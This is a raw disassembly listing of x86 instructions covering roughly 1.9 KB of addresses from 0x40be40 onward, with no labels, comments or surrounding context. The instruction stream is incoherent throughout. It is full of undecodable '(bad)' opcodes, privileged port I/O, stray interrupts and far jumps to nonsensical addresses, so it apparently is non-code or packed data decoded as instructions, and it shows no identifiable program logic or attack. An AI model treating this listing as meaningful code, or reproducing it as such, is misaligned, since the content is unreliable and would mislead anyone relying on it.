  40be40:	aad    0xc4
  40be42:	jnp    0x40be43
  40be44:	cs mov bl,0xbe
  40be47:	ret    
  40be48:	outs   dx,BYTE PTR ds:[esi]
  40be49:	and    DWORD PTR [ebx+0x1f5c4f66],ebp
  40be4f:	xchg   ecx,eax
  40be50:	fbstp  TBYTE PTR [edi+ebx*2+0x14]
  40be54:	and    DWORD PTR [ebp+0x63],esp
  40be57:	xchg   ebp,eax
  40be58:	icebp  
  40be59:	jle    0x40be23
  40be5b:	pop    ebp
  40be5c:	sub    edx,DWORD PTR [eax+0x39017e84]
  40be62:	stc    
  40be63:	cmc    
  40be64:	add    ah,BYTE PTR [edi+0x50]
  40be67:	(bad)  [esi+0xa]
  40be6a:	imul   esp,DWORD PTR [eax-0x50],0xffffffe6
  40be6e:	imul   edi,DWORD PTR [edx+0x28],0xffffffe4
  40be72:	xor    DWORD PTR [ecx+ebp*8-0x5081ad12],esi
  40be79:	inc    edx
  40be7a:	int3   
  40be7b:	dec    ecx
  40be7c:	xchg   edx,eax
  40be7d:	mov    bl,0x54
  40be7f:	xchg   esp,eax
  40be80:	sbb    eax,0x9273b8ba
  40be85:	and    al,0xba
  40be87:	mov    al,BYTE PTR [esi+ecx*4-0x7]
  40be8b:	jmp    0xfea7:0x66aafbec
  40be92:	mov    bh,0xeb
  40be94:	mov    bh,0xe
  40be96:	push   cs
  40be97:	(bad)
  40be9a:	push   ebx
  40be9b:	jns    0x40bec4
  40be9d:	sub    ebx,esi
  40be9f:	stos   DWORD PTR es:[edi],eax
  40bea0:	inc    ebx
  40bea1:	cmp    eax,0x183f55f2
  40bea6:	test   eax,0x46ad96cb
  40beab:	xchg   edi,eax
  40beac:	retf   0x3a83
  40beaf:	xor    al,0x15
  40beb1:	and    DWORD PTR [ecx],ecx
  40beb3:	mov    ebx,0xb9d11687
  40beb8:	dec    esp
  40beb9:	ret    0x674e
  40bebc:	fcomp  st(3)
  40bebe:	pop    eax
  40bebf:	sbb    edi,0x988c935c
  40bec5:	test   al,0x4d
  40bec7:	or     BYTE PTR [eax-0x55],al
  40beca:	in     eax,0x29
  40becc:	in     al,0x8d
  40bece:	pop    eax
  40becf:	mov    esi,0xffc054c0
  40bed4:	mov    cl,0x7d
  40bed6:	sti    
  40bed7:	sub    BYTE PTR [edi+ecx*8+0x33d5a236],dl
  40bede:	mov    ebp,0x7b5c06e5
  40bee3:	aad    0x26
  40bee5:	inc    edx
  40bee6:	adc    DWORD PTR [ebp-0x1e13fc80],0x6b25cb43
  40bef0:	data16 (bad) 
  40bef2:	cmp    DWORD PTR [ebx-0x2f],0xffffffeb
  40bef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef7:	nop
  40bef8:	shl    al,1
  40befa:	sbb    DWORD PTR [esi-0x790a05dd],eax
  40bf00:	aad    0xe1
  40bf02:	int3   
  40bf03:	push   0x1f466d3a
  40bf08:	ret    
  40bf09:	mov    ebp,DWORD PTR [edx+edi*8+0x2aa9fd56]
  40bf10:	cmp    al,BYTE PTR [edx-0x3b]
  40bf13:	arpl   WORD PTR [edi],cx
  40bf15:	in     al,dx
  40bf16:	pop    esi
  40bf17:	mov    ss,WORD PTR [edx+0x52]
  40bf1a:	fwait
  40bf1b:	repnz lahf 
  40bf1d:	stos   BYTE PTR es:[edi],al
  40bf1e:	retf   0x5cf3
  40bf21:	mov    ecx,0xa38ac17e
  40bf26:	sub    bl,BYTE PTR [ebx]
  40bf28:	xlat   BYTE PTR ds:[ebx]
  40bf29:	fwait
  40bf2a:	(bad)  
  40bf2b:	cli    
  40bf2c:	jnp    0x40bf1f
  40bf2e:	retf   
  40bf2f:	pop    edx
  40bf30:	inc    esi
  40bf31:	inc    esi
  40bf32:	dec    esp
  40bf33:	push   edi
  40bf34:	(bad)  
  40bf35:	stos   DWORD PTR es:[edi],eax
  40bf36:	mov    dh,0xf
  40bf38:	mov    bl,0xb2
  40bf3a:	sbb    BYTE PTR [eax],0xb2
  40bf3d:	cmp    al,0xc7
  40bf3f:	or     DWORD PTR [edi-0x3eec1b8c],0x66746982
  40bf49:	icebp  
  40bf4a:	out    dx,al
  40bf4b:	dec    edx
  40bf4c:	mov    cl,0xf5
  40bf4e:	push   ecx
  40bf4f:	push   esp
  40bf50:	jmp    0x40bf8d
  40bf52:	add    eax,esi
  40bf54:	inc    eax
  40bf55:	or     eax,0xc81e8c6c
  40bf5a:	test   eax,0x7b9a40e3
  40bf5f:	xor    DWORD PTR [ebx],esi
  40bf61:	in     al,0x85
  40bf63:	(bad)  
  40bf64:	imul   ebp,edi,0x4f
  40bf67:	dec    ebp
  40bf68:	mov    ebx,0x8f863ab
  40bf6d:	mov    ecx,0xebc92b9
  40bf72:	mov    edx,0x2aebb5ee
  40bf77:	inc    edx
  40bf78:	push   ebp
  40bf79:	jo     0x40bfae
  40bf7b:	mov    cl,0x20
  40bf7d:	inc    ebp
  40bf7e:	or     ah,BYTE PTR [ecx-0x1d01640]
  40bf84:	sub    DWORD PTR [ebx-0x3910d27a],0xb
  40bf8b:	pop    ss
  40bf8c:	popa   
  40bf8d:	mov    dh,0xe2
  40bf8f:	xor    BYTE PTR [eax+0x21b71b5b],bh
  40bf95:	cmc    
  40bf96:	test   DWORD PTR [ebp+esi*8-0x7a1524c8],0xa78e1b91
  40bfa1:	das    
  40bfa2:	sahf   
  40bfa3:	(bad)  
  40bfa5:	mov    ebx,fs
  40bfa7:	jmp    0xdf6224e0
  40bfac:	sbb    al,0x3d
  40bfae:	ss sub ah,cl
  40bfb1:	inc    ebp
  40bfb2:	popa   
  40bfb3:	jnp    0x40bff7
  40bfb5:	and    eax,0x99733d0b
  40bfba:	lock mov ebx,0x2d090710
  40bfc0:	cmp    DWORD PTR [bp+di],0x57
  40bfc4:	sub    eax,0x4067b93c
  40bfc9:	push   ebx
  40bfca:	add    bl,BYTE PTR [ecx+0x759377c8]
  40bfd0:	(bad)  
  40bfd1:	jmp    0x3f7f8e2c
  40bfd6:	sub    eax,0x8a001800
  40bfdb:	jnp    0x40bf83
  40bfdd:	or     eax,0xdfc4d17a
  40bfe2:	inc    ecx
  40bfe3:	jne    0x40c05e
  40bfe5:	mov    ds:0x54562448,eax
  40bfea:	in     eax,0x6e
  40bfec:	inc    ecx
  40bfed:	and    BYTE PTR [edi-0x18ef1c85],cl
  40bff3:	add    esp,edi
  40bff5:	xchg   ebp,eax
  40bff6:	adc    ch,BYTE PTR [ebx+edi*4-0x64d15b55]
  40bffd:	lea    edx,[ebx-0x75]
  40c000:	(bad)
  40c003:	int    0x41
  40c005:	movd   DWORD PTR [edx],mm7
  40c008:	adc    BYTE PTR [ecx+0x6f],0x4c
  40c00c:	dec    ebx
  40c00d:	rcl    eax,cl
  40c00f:	in     eax,dx
  40c010:	outs   dx,BYTE PTR ds:[esi]
  40c011:	cmp    al,ah
  40c013:	das    
  40c014:	xchg   ebx,eax
  40c015:	dec    ecx
  40c016:	push   ds
  40c017:	lock jno 0x40bff4
  40c01a:	jg     0x40bfbb
  40c01c:	inc    eax
  40c01d:	retf   
  40c01e:	inc    ebp
  40c01f:	loope  0x40c032
  40c021:	ds sub al,0xbe
  40c024:	fdiv   st(4),st
  40c026:	mov    bl,dh
  40c028:	jle    0x40c03e
  40c02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c02b:	loopne 0x40c07f
  40c02d:	out    dx,eax
  40c02e:	jbe    0x40bfb1
  40c030:	std    
  40c031:	pop    esi
  40c032:	sbb    eax,0x9fc53163
  40c037:	(bad)  
  40c038:	test   al,0x73
  40c03a:	loopne 0x40bfcb
  40c03c:	jne    0x40c048
  40c03e:	xor    eax,0xd8d0c31b
  40c043:	les    edi,FWORD PTR [ebp+0x71b18275]
  40c049:	mov    esp,0x53fedaee
  40c04e:	ja     0x40c046
  40c050:	mov    esp,0x9e2f85d4
  40c055:	ror    DWORD PTR [edi+0x1992d3be],cl
  40c05b:	jp     0x40bfe1
  40c05d:	push   eax
  40c05e:	fmul   st(3),st
  40c060:	xlat   BYTE PTR ds:[ebx]
  40c061:	and    BYTE PTR [ecx-0x4ef6e79d],bl
  40c067:	mov    ch,0xeb
  40c069:	mov    eax,ds:0x95be4f34
  40c06e:	pop    ecx
  40c06f:	aam    0x16
  40c071:	jge    0x40c0b0
  40c073:	and    DWORD PTR [ecx],ecx
  40c075:	adc    BYTE PTR [edi-0x6b56ce53],ch
  40c07b:	dec    esp
  40c07c:	fisub  DWORD PTR [esi]
  40c07e:	add    eax,eax
  40c080:	adc    BYTE PTR [esi+0x51],cl
  40c083:	arpl   WORD PTR [edi],bx
  40c085:	(bad)  
  40c086:	mov    ebx,0x326d9c65
  40c08b:	out    0xfa,eax
  40c08d:	ins    DWORD PTR es:[edi],dx
  40c08e:	push   ebx
  40c08f:	sbb    cl,dh
  40c091:	jle    0x40c060
  40c093:	imul   ecx,DWORD PTR [edi],0x7ad1b688
  40c099:	enter  0x39eb,0x43
  40c09d:	daa    
  40c09e:	or     BYTE PTR [esi-0x59da9408],bl
  40c0a4:	dec    esp
  40c0a5:	add    edi,ecx
  40c0a7:	outs   dx,BYTE PTR ds:[si]
  40c0a9:	test   ecx,esp
  40c0ab:	loop   0x40c091
  40c0ad:	mov    edi,0x5679c6d1
  40c0b2:	nop
  40c0b3:	cld    
  40c0b4:	jl     0x40c111
  40c0b6:	outs   dx,DWORD PTR ds:[esi]
  40c0b7:	rol    edx,0xb7
  40c0ba:	sahf   
  40c0bb:	mov    bl,BYTE PTR [edx]
  40c0bd:	int    0xb0
  40c0bf:	out    dx,al
  40c0c0:	fist   DWORD PTR [esi]
  40c0c2:	xor    BYTE PTR [ebx],dh
  40c0c4:	(bad)  
  40c0c5:	mov    bh,0xb6
  40c0c7:	pushf  
  40c0c8:	pop    edx
  40c0c9:	jae    0x40c0fe
  40c0cb:	add    eax,0x574ebe83
  40c0d0:	pop    ss
  40c0d1:	sub    al,0x67
  40c0d3:	sub    cl,BYTE PTR [eax+0x21609b80]
  40c0d9:	mov    esi,DWORD PTR [ebp-0x601fa917]
  40c0df:	ds das 
  40c0e1:	in     al,0x30
  40c0e3:	add    eax,0x7124ebe1
  40c0e8:	call   0x460dee2a
  40c0ed:	(bad)
  40c0f1:	addr16 pop ebp
  40c0f3:	push   sp
  40c0f5:	inc    ebp
  40c0f6:	loopne 0x40c13f
  40c0f8:	xchg   edi,eax
  40c0f9:	loope  0x40c144
  40c0fb:	rcl    BYTE PTR [edi+0x6a3b0a34],1
  40c101:	ss push 0x5b8fb9f8
  40c107:	or     eax,0x896c4306
  40c10c:	sub    BYTE PTR [esi+0x5dbac767],al
  40c112:	mov    dl,0x6b
  40c114:	mov    edi,0x9c183d82
  40c119:	jge    0x40c143
  40c11b:	imul   edi,DWORD PTR [ebx-0x7f91482a],0xffffffac
  40c122:	push   ecx
  40c123:	mov    ds:0xa4cf4b56,eax
  40c128:	add    dl,bl
  40c12a:	dec    esp
  40c12b:	add    cl,bh
  40c12d:	inc    edi
  40c12e:	mov    ch,0x65
  40c130:	inc    esp
  40c131:	dec    eax
  40c132:	xchg   BYTE PTR [ebx+0x6ef7263c],dh
  40c138:	jge    0x40c104
  40c13a:	xchg   ecx,eax
  40c13b:	dec    ebp
  40c13c:	lahf   
  40c13d:	add    eax,0x4e7d1490
  40c142:	and    eax,0xa4194505
  40c147:	aad    0xa8
  40c149:	shl    DWORD PTR [edx+0xdf58633],cl
  40c14f:	sbb    eax,0x3364afa
  40c154:	in     al,dx
  40c155:	mov    esp,0x6967dc84
  40c15a:	pop    edx
  40c15b:	or     BYTE PTR [ecx-0xa],al
  40c15e:	jbe    0x40c174
  40c160:	rcr    BYTE PTR [esp+ebp*8+0x53],0xbe
  40c165:	lods   al,BYTE PTR ds:[esi]
  40c166:	jb     0x40c175
  40c168:	stc    
  40c169:	or     DWORD PTR [ecx+0x13],0x488a81bf
  40c170:	pop    dx
  40c172:	not    BYTE PTR [ecx-0x720f7105]
  40c178:	cs dec edi
  40c17a:	dec    edi
  40c17b:	push   0xffffffc0
  40c17d:	in     eax,0x1d
  40c17f:	cdq    
  40c180:	pop    es
  40c181:	mov    bh,0xd3
  40c183:	pop    ss
  40c184:	add    eax,0xc6085561
  40c189:	mov    edi,0xb0d91f6f
  40c18e:	xor    eax,0x6f40c20a
  40c193:	adc    al,0x35
  40c195:	jo     0x40c1e4
  40c197:	mov    ds:0x74065cfe,eax
  40c19c:	pop    edi
  40c19d:	ja     0x40c170
  40c19f:	mov    bl,0x30
  40c1a1:	ror    DWORD PTR [ecx+0x6dfb0b2f],1
  40c1a7:	jb     0x40c15c
  40c1a9:	stos   BYTE PTR es:[edi],al
  40c1aa:	inc    eax
  40c1ab:	cmp    BYTE PTR [ecx+0x3da701f1],0x28
  40c1b2:	pop    ss
  40c1b3:	outs   dx,DWORD PTR ds:[esi]
  40c1b4:	stos   DWORD PTR es:[edi],eax
  40c1b5:	int    0xd7
  40c1b7:	pop    ebp
  40c1b8:	inc    ecx
  40c1b9:	push   ds
  40c1ba:	out    0x2,eax
  40c1bc:	pop    ds
  40c1bd:	mov    cl,0x21
  40c1bf:	jmp    0xfd66129b
  40c1c4:	aaa    
  40c1c5:	inc    ebx
  40c1c6:	mov    DWORD PTR [ebx+0x6c],ebx
  40c1c9:	push   edx
  40c1ca:	ds (bad) 
  40c1cc:	jmp    0x7e8991b6
  40c1d1:	cmp    eax,0xd9c3505f
  40c1d6:	push   edx
  40c1d7:	push   ebx
  40c1d8:	ja     0x40c21d
  40c1da:	push   ecx
  40c1db:	adc    eax,0x55f89d05
  40c1e0:	xor    al,0x44
  40c1e2:	sbb    al,0xef
  40c1e4:	repnz (bad) 
  40c1e6:	into   
  40c1e7:	mov    edi,0xdd84688e
  40c1ec:	sub    ch,BYTE PTR [ecx]
  40c1ee:	ficom  DWORD PTR [ecx+0x46b6eb72]
  40c1f4:	sub    DWORD PTR [ebp+0x7f],0xffffff9b
  40c1f8:	lea    ecx,[ebp+0x5c]
  40c1fb:	retf   0x4ff3
  40c1fe:	jmp    0x40c210
  40c200:	push   ebp
  40c201:	push   ebx
  40c202:	xchg   esp,eax
  40c203:	idiv   ah
  40c205:	rcl    ebx,cl
  40c207:	push   0x208b5f7d
  40c20c:	int3   
  40c20d:	rcr    DWORD PTR [esi+0x22],cl
  40c210:	jno    0x40c19a
  40c212:	lahf   
  40c213:	xor    dh,BYTE PTR [eax+0xd]
  40c216:	jp     0x40c1cf
  40c218:	enter  0x539c,0xdc
  40c21c:	bound  esp,QWORD PTR [esi]
  40c21e:	in     eax,dx
  40c21f:	pop    ebx
  40c220:	push   esp
  40c221:	pop    es
  40c222:	icebp  
  40c223:	mov    WORD PTR [ebx+ecx*1-0xc],ds
  40c227:	mov    al,ds:0x57956edd
  40c22c:	rol    DWORD PTR [ebx+0x71b38bf6],1
  40c232:	ds push ebp
  40c234:	mov    ah,0xf
  40c236:	mov    bl,0xd6
  40c238:	jg     0x40c222
  40c23a:	adc    al,0x69
  40c23c:	pop    ecx
  40c23d:	jp     0x40c1ea
  40c23f:	xor    eax,0x43cbfd52
  40c244:	xor    esp,0xffffff9d
  40c247:	xlat   BYTE PTR ds:[ebx]
  40c248:	rcl    ecx,1
  40c24a:	pop    esp
  40c24b:	cwde   
  40c24c:	fisubr DWORD PTR [esi-0x66]
  40c24f:	sti    
  40c250:	and    edi,DWORD PTR [eax]
  40c252:	in     eax,0xcb
  40c254:	jno    0x40c27c
  40c256:	and    al,0xe
  40c258:	out    dx,eax
  40c259:	jl     0x40c232
  40c25b:	sbb    dl,BYTE PTR [ebx]
  40c25d:	mov    eax,0x64864de8
  40c262:	mov    eax,0x98ed4c82
  40c267:	mov    ah,0x10
  40c269:	jmp    0xab7c:0x259012bc
  40c270:	xchg   ebp,eax
  40c271:	into   
  40c272:	mov    edx,0xc9f5ba54
  40c277:	loop   0x40c285
  40c279:	or     al,0x10
  40c27b:	add    eax,0xfbb64ed6
  40c280:	(bad)  [ecx+0x53]
  40c283:	ret    
  40c284:	or     al,0xb6
  40c286:	mov    dl,0xd1
  40c288:	mov    gs,WORD PTR [esi-0x553e4cc7]
  40c28e:	or     al,0x18
  40c290:	mov    ebp,0x8e1db587
  40c295:	sbb    ah,BYTE PTR [eax-0x80]
  40c298:	ror    DWORD PTR [edi],0xa2
  40c29b:	xor    esp,DWORD PTR [eax+0x40c3a2ec]
  40c2a1:	cmc    
  40c2a2:	and    dl,ah
  40c2a4:	stos   BYTE PTR es:[edi],al
  40c2a5:	add    ebx,DWORD PTR [esi]
  40c2a7:	dec    edi
  40c2a8:	push   ds
  40c2a9:	inc    ebx
  40c2aa:	xor    esp,DWORD PTR [esi]
  40c2ac:	sub    eax,0x9520c5f
  40c2b1:	sbb    eax,0x664b9538
  40c2b6:	neg    DWORD PTR [edi+0x4d]
  40c2b9:	leave  
  40c2ba:	retf   0x299d
  40c2bd:	mov    WORD PTR [ebx+ebp*1+0x283414f1],gs
  40c2c4:	fadd   st(6),st
  40c2c6:	retf   0xde
  40c2c9:	cwde   
  40c2ca:	in     al,0xbd
  40c2cc:	pop    es
  40c2cd:	or     DWORD PTR ss:[esp+ecx*2-0x12],esi
  40c2d2:	and    ecx,0xffffffc9
  40c2d5:	std    
  40c2d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d7:	mov    esi,0xd16550ad
  40c2dc:	sbb    BYTE PTR [eax],bl
  40c2de:	lds    esi,FWORD PTR [edx-0x42441d4c]
  40c2e4:	data16 (bad) 
  40c2e6:	rcl    BYTE PTR [esi-0x375fd54e],1
  40c2ec:	pop    esi
  40c2ed:	sbb    BYTE PTR [eax+esi*2-0x39],dh
  40c2f1:	ds push ebp
  40c2f3:	call   0xfcfb:0x73660230
  40c2fa:	xchg   edi,eax
  40c2fb:	pop    ds
  40c2fc:	lods   al,BYTE PTR ds:[esi]
  40c2fd:	dec    eax
  40c2fe:	mov    ch,0x36
  40c300:	or     BYTE PTR [eax+0x6ece3075],bh
  40c306:	cmc    
  40c307:	(bad)  
  40c308:	cdq    
  40c309:	mov    dl,BYTE PTR [ebp+0x5dd73fb9]
  40c30f:	xchg   edi,eax
  40c310:	push   edi
  40c311:	mov    al,0xfe
  40c313:	jne    0x40c352
  40c315:	cmp    ebx,DWORD PTR [edi+0x59ffc03f]
  40c31b:	inc    ebx
  40c31c:	lds    edi,FWORD PTR [esi+0x46]
  40c31f:	adc    ecx,eax
  40c321:	xor    cl,al
  40c323:	dec    ebp
  40c324:	rcl    BYTE PTR [eax+0x3c26e0ef],1
  40c32a:	int    0xb6
  40c32c:	dec    ebp
  40c32d:	mov    esp,0x3bdfad78
  40c332:	and    bl,BYTE PTR [ebp+0x3f]
  40c335:	dec    esi
  40c336:	dec    edx
  40c337:	iret   
  40c338:	push   edx
  40c339:	loop   0x40c348
  40c33b:	test   al,0x74
  40c33d:	dec    ecx
  40c33e:	std    
  40c33f:	pop    eax
  40c340:	call   0x73a2:0x640e752
  40c347:	jo     0x40c3bf
  40c349:	arpl   dx,sp
  40c34b:	or     cl,dl
  40c34d:	xor    ch,ah
  40c34f:	jo     0x40c2e8
  40c351:	pop    ds
  40c352:	es hlt 
  40c354:	aaa    
  40c355:	test   DWORD PTR [eax-0x2bf8c1fe],ecx
  40c35b:	pop    esi
  40c35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c35d:	adc    ah,dl
  40c35f:	dec    ebx
  40c360:	sbb    ebp,esi
  40c362:	mov    ds:0x187a599e,eax
  40c367:	pop    edx
  40c368:	or     BYTE PTR ds:0xc40b342e,dl
  40c36e:	jb     0x40c331
  40c370:	and    al,0xf1
  40c372:	in     al,dx
  40c373:	loopne 0x40c3d8
  40c375:	std    
  40c376:	mov    ebp,0xb48b5434
  40c37b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c37c:	es test al,0x7b
  40c37f:	scas   eax,DWORD PTR es:[edi]
  40c380:	jo     0x40c3be
  40c382:	loope  0x40c355
  40c384:	outs   dx,BYTE PTR ds:[esi]
  40c385:	push   ds
  40c386:	add    eax,0xa14983e0
  40c38b:	jl     0x40c399
  40c38d:	enter  0x1ea5,0x8c
  40c391:	add    eax,0x71b09f62
  40c396:	in     eax,0xc3
  40c398:	push   0x87e015bf
  40c39d:	mov    eax,ds:0xe83a268a
  40c3a2:	inc    ebx
  40c3a3:	int3   
  40c3a4:	loope  0x40c3a5
  40c3a6:	jne    0x40c401
  40c3a8:	cmc    
  40c3a9:	adc    BYTE PTR [esi],ch
  40c3ab:	fs add bh,al
  40c3ae:	inc    esp
  40c3af:	cdq    
  40c3b0:	adc    al,0xd3
  40c3b2:	fadd   QWORD PTR [edx+0x74]
  40c3b5:	dec    eax
  40c3b6:	adc    bh,dl
  40c3b8:	lock dec esi
  40c3ba:	shl    DWORD PTR [edi+ebx*4],0x91
  40c3be:	mov    ch,0x4d
  40c3c0:	pop    ss
  40c3c1:	sub    eax,0x3d065da0
  40c3c6:	(bad)  
  40c3c8:	outs   dx,BYTE PTR ds:[esi]
  40c3c9:	daa    
  40c3ca:	hlt    
  40c3cb:	cmp    BYTE PTR [eax],bl
  40c3cd:	push   ss
  40c3ce:	push   edi
  40c3cf:	or     BYTE PTR [edx],ah
  40c3d1:	add    ch,BYTE PTR [edi+esi*1-0x50f2c4ee]
  40c3d8:	inc    ecx
  40c3d9:	pand   mm5,mm6
  40c3dc:	dec    eax
  40c3dd:	das    
  40c3de:	repnz pop edi
  40c3e0:	cli    
  40c3e1:	pushf  
  40c3e2:	jbe    0x40c3e5
  40c3e4:	push   ebp
  40c3e5:	sbb    esp,DWORD PTR [edi]
  40c3e7:	cmp    BYTE PTR [esi],0x3f
  40c3ea:	movq   QWORD PTR [edx+0x51070f76],mm1
  40c3f1:	inc    eax
  40c3f2:	ja     0x40c3ea
  40c3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3f5:	inc    ebp
  40c3f6:	and    dl,BYTE PTR fs:[ebp+ecx*4+0x51eaa856]
  40c3fe:	lock xchg edx,eax
  40c400:	adc    BYTE PTR [edi-0x3e43a4d9],ch
  40c406:	int    0x35
  40c408:	icebp  
  40c409:	sub    DWORD PTR [edi+0x29],ebx
  40c40c:	aad    0x58
  40c40e:	scas   eax,DWORD PTR es:[edi]
  40c40f:	add    DWORD PTR [eax],esi
  40c411:	adc    eax,DWORD PTR [edi]
  40c413:	pop    eax
  40c414:	cld    
  40c415:	mov    al,ds:0x932e8443
  40c41a:	outs   dx,DWORD PTR ds:[esi]
  40c41b:	popa   
  40c41c:	adc    edx,DWORD PTR [ebp-0x6488b5bc]
  40c422:	mov    ebx,0xd92cafd5
  40c427:	push   ebp
  40c428:	jo     0x40c418
  40c42a:	inc    ebp
  40c42b:	and    ebp,ecx
  40c42d:	aam    0xdf
  40c42f:	cld    
  40c430:	rcr    BYTE PTR [ebx],0xe
  40c433:	push   esp
  40c434:	xchg   DWORD PTR [ebp-0x3c],ebx
  40c437:	xchg   edx,eax
  40c438:	test   BYTE PTR [edx],bh
  40c43a:	xlat   BYTE PTR ds:[ebx]
  40c43b:	jmp    FWORD PTR [edx+0xd]
  40c43e:	lahf   
  40c43f:	cmp    edx,esi
  40c441:	sub    al,0xd6
  40c443:	ja     0x40c423
  40c445:	mov    edx,0x99cbcd66
  40c44a:	fwait
  40c44b:	je     0x40c3f5
  40c44d:	pop    ebp
  40c44e:	mov    edi,0x1d608555
  40c453:	or     eax,0xa4db00ce
  40c458:	cdq    
  40c459:	fdiv   DWORD PTR [ecx+0x72]
  40c45c:	push   ss
  40c45d:	dec    ebx
  40c45e:	int    0x94
  40c460:	pop    edx
  40c461:	mov    esi,DWORD PTR [esi-0x2a63a443]
  40c467:	cli    
  40c468:	push   eax
  40c469:	xchg   DWORD PTR [ebx-0x33],esi
  40c46c:	xlat   BYTE PTR ds:[ebx]
  40c46d:	test   DWORD PTR [edx],0x4325ef76
  40c473:	rcl    DWORD PTR [ecx-0x76],1
  40c476:	fsubr  st,st(1)
  40c478:	xchg   DWORD PTR [edx+0x9],edi
  40c47b:	ror    BYTE PTR [eax-0x30c3d6a8],0xd8
  40c482:	aad    0xb1
  40c484:	sahf   
  40c485:	daa    
  40c486:	test   eax,0x33826fc
  40c48b:	xor    eax,0x34194aca
  40c490:	inc    ebx
  40c491:	rcl    DWORD PTR [edx+0x23c8f0eb],1
  40c497:	jg     0x40c486
  40c499:	das    
  40c49a:	or     cl,BYTE PTR [edi+0x5acaa61d]
  40c4a0:	ins    DWORD PTR es:[edi],dx
  40c4a1:	pop    ss
  40c4a2:	xor    BYTE PTR [esi+0x2e],ah
  40c4a5:	jmp    0x69651d60
  40c4aa:	into   
  40c4ab:	fs std 
  40c4ad:	mov    eax,0x36c723fe
  40c4b2:	cwde   
  40c4b3:	xlat   BYTE PTR ds:[ebx]
  40c4b4:	fmul   DWORD PTR [esi+esi*4]
  40c4b7:	mov    esi,0xb14bd4d0
  40c4bc:	out    dx,eax
  40c4bd:	sbb    BYTE PTR [edx-0x4fc61135],bh
  40c4c3:	inc    esi
  40c4c4:	iret   
  40c4c5:	aas    
  40c4c6:	ja     0x40c50c
  40c4c8:	jnp    0x40c44a
  40c4ca:	cmp    dl,bh
  40c4cc:	out    dx,al
  40c4cd:	jp     0x40c461
  40c4cf:	not    ah
  40c4d1:	mul    ch
  40c4d3:	sub    edi,DWORD PTR [esi-0x56270740]
  40c4d9:	inc    esi
  40c4da:	sbb    BYTE PTR [esi+0x47998623],bh
  40c4e0:	sbb    BYTE PTR [eax+eiz*1+0x4ecbeb09],al
  40c4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e8:	loopne 0x40c49a
  40c4ea:	push   ds
  40c4eb:	std    
  40c4ec:	dec    edi
  40c4ed:	or     cl,bl
  40c4ef:	dec    ebx
  40c4f0:	pop    ebx
  40c4f1:	leave  
  40c4f2:	push   ebx
  40c4f3:	in     al,0x64
  40c4f5:	dec    ebp
  40c4f6:	xchg   DWORD PTR ds:0x2150d5c3,ebx
  40c4fc:	pop    edx
  40c4fd:	test   al,0xb7
  40c4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c500:	adc    al,0xa5
  40c502:	popa   
  40c503:	jb     0x40c520
  40c505:	imul   ecx,ecx,0x12
  40c508:	fdivr  QWORD PTR [esi+0x7cf0202d]
  40c50e:	adc    BYTE PTR [edx],ah
  40c510:	fst    QWORD PTR [esi+0x20a027fb]
  40c516:	cmp    eax,0x4f4e67e6
  40c51b:	ins    BYTE PTR es:[edi],dx
  40c51c:	call   0x36f46771
  40c521:	mov    esp,esi
  40c523:	mov    dl,0xd5
  40c525:	mov    eax,0xbb0b723a
  40c52a:	into   
  40c52b:	xor    eax,0xf0de217c
  40c530:	loopne 0x40c526
  40c532:	jne    0x40c54b
  40c534:	sub    DWORD PTR [esp+0x4b],ebx
  40c538:	aam    0x92
  40c53a:	clc    
  40c53b:	retf   0x7efa
  40c53e:	push   edx
  40c53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c540:	dec    edi
  40c541:	mov    cl,0x7c
  40c543:	cmp    DWORD PTR [ebx+0x57098b54],0xffffffe1
  40c54a:	(bad)  
  40c54b:	sub    esp,DWORD PTR [edx-0x2ccd101]
  40c551:	sub    al,0x97
  40c553:	pop    ss
  40c554:	es push esi
  40c556:	mov    ch,0xbf
  40c558:	pusha  
  40c559:	push   ecx
  40c55a:	push   ds
  40c55b:	je     0x40c5a5
  40c55d:	rcr    BYTE PTR [ebp+0x6d],1
  40c560:	int3   
  40c561:	xor    al,0x2e
  40c563:	mov    edi,0x4e2bf983
  40c568:	mov    ebp,DWORD PTR [edi+eax*1+0x42d5ed68]
  40c56f:	inc    ebx
  40c570:	imul   edi,DWORD PTR [edi+0x1a15e1ce],0xfffffff9
  40c577:	out    dx,al
  40c578:	popa   
  40c579:	inc    edi
  40c57a:	shl    DWORD PTR [edx+0x14],1
  40c57d:	inc    ebx
  40c57e:	mov    dh,0x8
  40c580:	sbb    esp,edi
  40c582:	add    DWORD PTR [ecx-0x27cf0c19],esp
  40c588:	and    bl,BYTE PTR [edx-0x2a]
  40c58b:	mov    al,ds:0x7cc3d8f4
  40c590:	push   eax
  40c591:	pop    esi
  40c592:	lds    ebp,FWORD PTR [esi]
  40c594:	xor    BYTE PTR [ebp+0x3938e507],al
  40c59a:	rol    DWORD PTR [ebp-0xb1c593e],0xe0
  40c5a1:	test   bh,dl
  40c5a3:	outs   dx,DWORD PTR ds:[esi]
  40c5a4:	adc    eax,0x32ff3104
  40c5a9:	ror    BYTE PTR [eax],0x38
  40c5ac:	cli    
  40c5ad:	pushf  
  40c5ae:	addr16 fcomi st,st(3)
  40c5b1:	loop   0x40c603
  40c5b3:	xor    DWORD PTR [ebp+0x2a],0x8e8eeb9f
  40c5ba:	pop    esi
  40c5bb:	bound  esp,QWORD PTR fs:[edx-0x6]
  40c5bf:	mov    cl,0x57
  40c5c1:	inc    ebp
  40c5c2:	out    dx,eax
  40c5c3:	sub    eax,0x5fca3437
  40c5c8:	pop    ecx
  40c5c9:	mov    DWORD PTR ds:0xd3899e52,0x56a18ef2
  40c5d3:	fcmovne st,st(7)
  40c5d5:	test   BYTE PTR [ebx+0x79],ch
  40c5d8:	sub    BYTE PTR [esi+0x4c],0x20
  40c5dc:	xor    DWORD PTR [ebp+0x6185d37c],esp
  40c5e2:	stc    
  40c5e3:	add    eax,0x49e5b69f
  40c5e8:	add    DWORD PTR fs:[edx+0x22243e45],ecx
  40c5ef:	jmp    0x77f114ca
  40c5f4:	adc    ecx,ebx
  40c5f6:	xor    dl,dl
  40c5f8:	fidivr DWORD PTR [edi-0x33]
